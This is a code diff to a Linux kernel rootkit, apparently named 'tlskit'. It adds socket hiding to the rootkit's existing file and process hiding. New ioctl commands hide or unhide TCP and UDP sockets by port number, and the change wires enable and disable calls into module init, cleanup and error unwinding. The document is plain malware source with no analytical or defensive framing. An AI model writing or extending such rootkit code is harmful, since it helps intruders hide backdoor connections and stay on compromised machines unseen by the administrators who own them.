@@ -14,8 +14,12 @@
 #include "file_hiding.h"
 #include "process_hiding.h"
 #include "proc_hook.h"
+#include "socket_hiding.h"
 
 static int cleanup(void *_data) {
+
+    /* Disable socket hiding */
+    disable_socket_hiding();
 
     /* Disable process hiding */
     disable_process_hiding();
@@ -120,6 +124,46 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
             }
             return ret;
 
+        case RKCTL_TCP_HIDE:
+
+            /*
+             *
+             */
+            if (0 > (ret = hide_socket((unsigned short) arg, PROTO_TCP))) {
+                return -EINVAL;
+            }
+            return ret;
+
+        case RKCTL_TCP_UNHIDE:
+
+            /*
+             *
+             */
+            if (0 > (ret = unhide_socket((unsigned short) arg, PROTO_TCP))) {
+                return -EINVAL;
+            }
+            return ret;
+
+        case RKCTL_UDP_HIDE:
+
+            /*
+             *
+             */
+            if (0 > (ret = hide_socket((unsigned short) arg, PROTO_UDP))) {
+                return -EINVAL;
+            }
+            return ret;
+
+        case RKCTL_UDP_UNHIDE:
+
+            /*
+             *
+             */
+            if (0 > (ret = unhide_socket((unsigned short) arg, PROTO_UDP))) {
+                return -EINVAL;
+            }
+            return ret;
+
         default:
             return -ENOTTY;
     }
@@ -166,9 +210,15 @@ static int __init tlskit_init(void) {
         goto process_failed;
     }
 
+    if (0 != enable_socket_hiding()) {
+        goto socket_failed;
+    }
+
     return 0;
 
 /* disable all the enabled functionality */
+socket_failed:
+    disable_process_hiding();
 process_failed:
     disable_proc_filter();
 proc_failed:
